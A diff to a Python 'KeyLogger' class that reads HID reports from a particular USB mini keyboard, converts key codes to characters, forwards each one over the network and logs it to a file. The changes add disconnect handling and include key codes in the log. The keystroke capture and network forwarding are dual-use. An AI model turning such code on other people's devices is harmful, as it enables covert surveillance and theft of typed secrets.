@@ -67,7 +67,6 @@ class KeyLogger:
 
     # TODO: Rewrite this code
     def run(self):
-
         # #Mini Keyboard
         id_vendor = 0x1c4f
         device_id = 0x008b
@@ -79,7 +78,11 @@ class KeyLogger:
 
         # Read and process HID reports
         while True:
-            data = keyboard.read(8)  # Read an 8-byte HID report
+            try:
+                data = keyboard.read(8)  # Read an 8-byte HID report
+            except OSError:
+                logging.error("Keyboard no longer connected")
+                exit()
             if data:
                 key_code = data[2]  # The key code is in byte 2
                 if key_code < 30:
@@ -90,11 +93,10 @@ class KeyLogger:
                     char = chr(39 + 9)
                 else:
                     char = "Not FOUND"
-                print(f"Key pressed: {key_code} ({char})")
                 if char:
                     try:
                         self.__forwarder.send_over_network(data=char)
                         # write data in file
-                        self.data_handler.write(char)
+                        self.data_handler.write(f'{key_code} {char}')
                     except ConnectionResetError:
                         self.__forwarder.listen()
